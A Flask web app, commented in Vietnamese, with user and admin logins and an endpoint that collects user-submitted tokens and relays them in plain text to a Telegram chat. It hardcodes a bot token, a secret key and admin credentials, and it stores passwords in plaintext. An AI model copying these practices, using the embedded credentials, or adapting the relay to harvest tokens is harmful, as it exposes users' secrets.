from flask import Flask, render_template, request, redirect, url_for, session, jsonify
import requests
import os
import json
from datetime import datetime

app = Flask(__name__, static_folder='static', template_folder='templates')

# QUAN TRỌNG: Secret key cố định, không đổi
app.secret_key = os.environ.get('SECRET_KEY', 'khoa_bi_mat_khanhbot_2026_secure')
# Cấu hình session lưu trên server (không dùng cookie client)
app.config['SESSION_TYPE'] = 'filesystem'
app.config['SESSION_PERMANENT'] = True
app.config['PERMANENT_SESSION_LIFETIME'] = 3600  # 1 giờ

# Cấu hình Telegram
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8928657652:AAFmDv6nlNcoxqKtB2gmcZ1kyvnjj5rd2A8')
CHAT_ID = os.environ.get('CHAT_ID', '8003369858')

ADMIN_USERNAME = "khanhbot"
ADMIN_PASSWORD = "khanhdeptrai"

DATA_FILE = "/tmp/data.json"

def load_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {"users": [], "tokens": []}

def save_data(data):
    with open(DATA_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

data = load_data()

# ---------- HÀM GỬI TELEGRAM ----------
def send_telegram(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
    try:
        response = requests.post(url, json=payload, timeout=10)
        print("Telegram response:", response.status_code, response.text)
        return response.json()
    except Exception as e:
        print("Lỗi gửi Telegram:", e)
        return None

# ---------- ROUTES ----------
@app.route('/')
def index():
    # Debug: in session ra log
    print(f"Session user: {session.get('user')}")
    return render_template('index.html', user=session.get('user'))

@app.route('/dangki', methods=['GET', 'POST'])
def dangki():
    if session.get('user'):
        return redirect(url_for('index'))
    
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username and password:
            for u in data['users']:
                if u['username'] == username:
                    return render_template('dangki.html', error="Tên đăng nhập đã tồn tại")
            data['users'].append({
                'username': username,
                'password': password,
                'created_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'status': 'active'
            })
            save_data(data)
            return redirect(url_for('login'))
    return render_template('dangki.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if session.get('user'):
        return redirect(url_for('index'))
    
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        print(f"Login attempt: {username}")  # Debug
        
        for u in data['users']:
            if u['username'] == username and u['password'] == password and u['status'] == 'active':
                session['user'] = username
                session.permanent = True
                print(f"Login success: {username}, session: {session.get('user')}")  # Debug
                return redirect(url_for('index'))
        
        return render_template('login.html', error="Sai tài khoản hoặc mật khẩu")
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.pop('user', None)
    return redirect(url_for('index'))

@app.route('/admin_login', methods=['GET', 'POST'])
def admin_login():
    if session.get('admin'):
        return redirect(url_for('dashboard'))
    
    if request.method == 'POST':
        user = request.form.get('username')
        pwd = request.form.get('password')
        if user == ADMIN_USERNAME and pwd == ADMIN_PASSWORD:
            session['admin'] = True
            session.permanent = True
            return redirect(url_for('dashboard'))
        else:
            return render_template('admin_login.html', error="Sai tài khoản hoặc mật khẩu")
    return render_template('admin_login.html')

@app.route('/dashboard')
def dashboard():
    if not session.get('admin'):
        return redirect(url_for('admin_login'))
    return render_template('dashboard.html', users=data['users'], tokens=data['tokens'])

@app.route('/admin/logout')
def admin_logout():
    session.pop('admin', None)
    return redirect(url_for('index'))

# ---------- API QUẢN LÝ USER ----------
@app.route('/admin/user/add', methods=['POST'])
def add_user():
    if not session.get('admin'):
        return jsonify({"status": "error", "msg": "Unauthorized"}), 401
    username = request.form.get('username')
    password = request.form.get('password')
    if not username or not password:
        return jsonify({"status": "error", "msg": "Thiếu thông tin"}), 400
    for u in data['users']:
        if u['username'] == username:
            return jsonify({"status": "error", "msg": "User đã tồn tại"}), 400
    data['users'].append({
        'username': username,
        'password': password,
        'created_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'status': 'active'
    })
    save_data(data)
    return jsonify({"status": "ok", "msg": "Thêm user thành công"})

@app.route('/admin/user/delete/<username>', methods=['POST'])
def delete_user(username):
    if not session.get('admin'):
        return jsonify({"status": "error", "msg": "Unauthorized"}), 401
    data['users'] = [u for u in data['users'] if u['username'] != username]
    save_data(data)
    return jsonify({"status": "ok", "msg": "Xóa user thành công"})

@app.route('/admin/user/toggle/<username>', methods=['POST'])
def toggle_user(username):
    if not session.get('admin'):
        return jsonify({"status": "error", "msg": "Unauthorized"}), 401
    for u in data['users']:
        if u['username'] == username:
            u['status'] = 'blocked' if u['status'] == 'active' else 'active'
            save_data(data)
            return jsonify({"status": "ok", "msg": f"User {u['status']}"})
    return jsonify({"status": "error", "msg": "Không tìm thấy user"}), 404

# ---------- API NHẬN TOKEN ----------
@app.route('/submit_token', methods=['POST'])
def submit_token():
    if not session.get('user'):
        return jsonify({"status": "error", "msg": "Vui lòng đăng nhập trước khi gửi token"}), 401

    req_data = request.get_json()
    token = req_data.get('token', '').strip()
    if not token:
        return jsonify({"status": "error", "msg": "Token rỗng"}), 400

    username = session.get('user')
    
    data['tokens'].append({
        'token': token,
        'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'status': 'pending',
        'user': username
    })
    save_data(data)

    message = f"🔑 TOKEN MỚI\n👤 Người gửi: {username}\n🔐 Token: {token}\n🕐 Thời gian: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    send_telegram(message)

    return jsonify({"status": "ok", "msg": "Token đã gửi admin"})

@app.route('/admin/token/process/<int:index>', methods=['POST'])
def process_token(index):
    if not session.get('admin'):
        return jsonify({"status": "error", "msg": "Unauthorized"}), 401
    if 0 <= index < len(data['tokens']):
        data['tokens'][index]['status'] = 'processed'
        save_data(data)
        return jsonify({"status": "ok", "msg": "Đã xử lý token"})
    return jsonify({"status": "error", "msg": "Token không tồn tại"}), 404

if __name__ == '__main__':
    if not os.path.exists('templates'):
        os.makedirs('templates')
    if not os.path.exists('static/css'):
        os.makedirs('static/css')
    if not os.path.exists('static/js'):
        os.makedirs('static/js')
    port = int(os.environ.get('PORT', 10000))
    app.run(debug=False, host='0.0.0.0', port=port)